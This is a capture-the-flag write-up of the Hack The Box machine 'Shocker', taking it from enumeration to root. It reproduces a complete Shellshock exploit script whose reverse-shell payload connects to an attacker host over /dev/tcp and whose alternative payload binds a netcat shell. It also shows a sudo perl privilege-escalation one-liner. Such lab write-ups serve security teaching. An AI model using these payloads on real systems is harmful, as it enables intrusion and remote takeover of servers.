# Shocker | HTB 
### Difficulty Level: Easy
----------------------------------------------------

First, start with nmap scan:

```bash
nmap -p- -T4 -A 10.10.10.56 -oN shocker.nmap
```

Results:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 10:00 EDT
Nmap scan report for 10.10.10.56
Host is up (0.086s latency).
Not shown: 65493 closed tcp ports (reset), 40 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/20%OT=80%CT=1%CU=34868%PV=Y%DS=2%DC=T%G=Y%TM=65FA
OS:ED2A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%II=I%TS=8)SEQ(S
OS:P=105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI
OS:=I%II=I%TS=8)OPS(O1=M53CST11NW6%O2=M53CST11NW6%O3=M53CNNT11NW6%O4=M53CST
OS:11NW6%O5=M53CST11NW6%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=
OS:7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   83.96 ms 10.10.14.1
2   84.21 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 284.35 seconds
```

There are 2 open ports:

80 - HTTP

2222 - SSH

Browsw into the webpage. I didn't get any access so let's add the ip address to /etc/hosts.

```bash
echo '10.10.10.56    shocker.htb' >> /etc/hosts
```

 And there is a webpage:

 ![image](https://cdn-images-1.medium.com/max/1000/1*wDiDo-7di39upvReK-Btzg.png)


Start with directories enumeration with gobuster :

```bash
└─# gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This dictionary attack didn't find anythinq so I decided to try another directory:

```bash
└─# gobuster dir -u http://shocker.htb -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shocker.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
```

There is /cgi-bin.
This directory includes scripts that the web server can run.

Let's navigate there:

![image](https://cdn-images-1.medium.com/max/1000/1*OiXDOBgyBD37G48ZJeKDlg.png)


It's time to brute force to get the scripts name inside the directory:

```bash
└─# gobuster dir -u http://shocker.htb/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .sh .cgi  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shocker.htb/cgi-bin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
```

There is a file: user.sh

Let's pull it to our machine:

```bash
wget http://10.10.10.56/cgi-bin/user.sh
```

After grabbing it, cat it:

```
Content-Type: text/plain

Just an uptime test script

 15:28:38 up  5:28,  0 users,  load average: 0.00, 0.00, 0.00
```

something special.

I didn't know what to do at that moment so let's see if there is something in google.

After searching apache-cgi exploit, I ran into an exploit:


![image]("https://cdn-images-1.medium.com/max/1000/1*oicGTU9ZFgui6YwoBbsOcQ.png")


I search it on metasploit and grab the exploit to my machine:

```bash
searchsploit apache cgi    
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution              | php/remote/29290.c
Apache 0.8.x/1.0.x / NCSA HTTPd 1.x - 'test-cgi' Directory Listing           | cgi/remote/20435.txt
Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1.12/1.1/2.0 - a nph-test-cg | multiple/dos/19536.txt
Apache 1.3.34/1.3.33 (Ubuntu / Debian) - CGI TTY Privilege Escalation        | linux/local/3384.c
Apache 2.2.2 - CGI Script Source Code Information Disclosure                 | multiple/remote/28365.txt
Apache mod_cgi - 'Shellshock' Remote Command Injection                       | linux/remote/34900.py
Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Execution (Met | windows/remote/47073.rb
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload By | windows/webapps/42953.txt
AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution   | cgi/webapps/35035.txt
```

```
searchsploit -m 34900.py
```

The content of the script:
```bash
#!/usr/bin/env python
from socket import *
from threading import Thread
import thread, time, httplib, urllib, sys

stop = False
proxyhost = ""
proxyport = 0

def usage():
        print """

                Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
"""
        sys.exit(0)

def exploit(lhost,lport,rhost,rport,payload,pages):
        headers = {"Cookie": payload, "Referer": payload}

        for page in pages:
                if stop:
                        return
                print "[-] Trying exploit on : "+page
                if proxyhost != "":
                        c = httplib.HTTPConnection(proxyhost,proxyport)
                        c.request("GET","http://"+rhost+page,headers=headers)
                        res = c.getresponse()
                else:
                        c = httplib.HTTPConnection(rhost)
                        c.request("GET",page,headers=headers)
                        res = c.getresponse()
                if res.status == 404:
                        print "[*] 404 on : "+page
                time.sleep(1)


args = {}

for arg in sys.argv[1:]:
        ar = arg.split("=")
        args[ar[0]] = ar[1]
try:
        args['payload']
except:
        usage()

if args['payload'] == 'reverse':
        try:
                lhost = args['lhost']
                lport = int(args['lport'])
                rhost = args['rhost']
                payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
        except:
                usage()
elif args['payload'] == 'bind':
        try:
                rhost = args['rhost']
                rport = args['rport']
                payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
        except:
                usage()
else:
        print "[*] Unsupported payload"
        usage()

try:
        pages = args['pages'].split(",")
except:
        pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]

try:
        proxyhost,proxyport = args['proxy'].split(":")
except:
        pass

if args['payload'] == 'reverse':
        serversocket = socket(AF_INET, SOCK_STREAM)
        buff = 1024
        addr = (lhost, lport)
        serversocket.bind(addr)
        serversocket.listen(10)
        print "[!] Started reverse shell handler"
        thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
if args['payload'] == 'bind':
        serversocket = socket(AF_INET, SOCK_STREAM)
        addr = (rhost,int(rport))
        thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))

buff = 1024

while True:
        if args['payload'] == 'reverse':
                clientsocket, clientaddr = serversocket.accept()
                print "[!] Successfully exploited"
                print "[!] Incoming connection from "+clientaddr[0]
                stop = True
                clientsocket.settimeout(3)
                while True:
                        reply = raw_input(clientaddr[0]+"> ")
                        clientsocket.sendall(reply+"\n")
                        try:
                                data = clientsocket.recv(buff)
                                print data
                        except:
                                pass

        if args['payload'] == 'bind':
                try:
                        serversocket = socket(AF_INET, SOCK_STREAM)
                        time.sleep(1)
                        serversocket.connect(addr)
                        print "[!] Successfully exploited"
                        print "[!] Connected to "+rhost
                        stop = True
                        serversocket.settimeout(3)
                        while True:
                                reply = raw_input(rhost+"> ")
                                serversocket.sendall(reply+"\n")
                                data = serversocket.recv(buff)
                                print data
                except:
                        pass
```

It looks like it creats a reverse shell.

I tried t to run it with the variables that are needed, but it didn't work so I decide to use metasploit.

after finding the exploit let's set:

rhost

lhost

targeturi


![image](https://cdn-images-1.medium.com/max/1000/1*1liPHSgx5VgRSqY-o1uIHQ.png)


and there is a  meterpereter shell.

Let's grab user.txt flag.

```bash
meterpreter > shell
Process 1520 created.
Channel 1 created.
ls
user.sh
/bin/bash -i
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ ls
ls
user.sh
shelly@Shocker:/usr/lib/cgi-bin$ cd ..
cd ..
shelly@Shocker:/usr/lib$ cd /home/shelly
cd /home/shelly
shelly@Shocker:~$ ls
ls
user.txt
shelly@Shocker:~$ cat user.txt
cat user.txt
********************************
shelly@Shocker:~$
```


After getting it, let's escalate our privilliges and be root.

use this command to understand which files can run by a regulare user as root.

```bash
sudo -l
```

There is a file that shelly can run as root.

```bash
shelly@Shocker:/var/www$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

There is binary file of perl so let's check how can gtfobins can help us.


https://gtfobins.github.io/gtfobins/perl/


![image](https://cdn-images-1.medium.com/max/1000/1*r1ZN2xnRGv5MhSf9RDC8wg.png)


use this command and there is a shell as root.

Grab /root/root.txt 

```bash
shelly@Shocker:/var/www$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
********************************
#
```
THIS IS THE END.

***Written by Alon Presman, Penetration Tester and Ethical Hacker.***


































 





